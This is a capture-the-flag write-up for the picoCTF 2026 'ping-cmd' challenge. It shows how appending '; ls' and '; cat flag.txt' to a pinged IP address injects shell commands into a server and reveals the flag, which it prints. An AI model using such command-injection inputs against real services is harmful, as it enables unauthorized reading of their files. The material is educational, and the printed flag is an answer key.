ping-cmd

Name: ping-cmd
Description: Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input? You can connect to the service here nc mysterious-sea.picoctf.net 64720
Author: Yahaya Meddy
Tags: Easy, General Skills, picoCTF 2026
Challenge from: picoCTF 2026
Hints:
1. The program uses a shell command behind the scenes.
2. Sometimes, You can run more than one command at a time.

Theory

According to the description, to get the flag we have to make the server reveal its secrets by pinging DNS servers, like Google's DNS. The description also questions what would happen if we got "a little creative", so yeah, it's pretty obvious that this challenge is about input injection. But first we need to see how the NetCat works by entering, so we'll go onto the solution part.

Solution

If we enter the example IP we're told about we can see how the NetCat works:

shukularuni@SHUKULAP:~$ nc mysterious-sea.picoctf.net 64720
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.55 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.52 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.515/9.534/9.554/0.019 ms
^C

What the challenge is doing is basically described by this command:

ping -c 2 <input>

And it prints the output of this command, the thing is that we can attach another command after that because it probably has no protection against input injection and it's just basic linux commands, so we can do this:

ping -c 2 8.8.8.8; ls

If we do that, it'll work normally and give the output to the ls command after ping, so let's check if that works here:

shukularuni@SHUKULAP:~$ nc mysterious-sea.picoctf.net 64720
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.64 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.55 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.550/9.593/9.637/0.043 ms
flag.txt
script.sh
^C

So it does work. Now that we know the name of the file containing the flag, we can view it with cat:

ping -c 2 8.8.8.8; cat flag.txt
shukularuni@SHUKULAP:~$ nc mysterious-sea.picoctf.net 64720
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.53 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.56 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.532/9.545/9.559/0.013 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_b75fc848}^C

There we go! That's the flag.
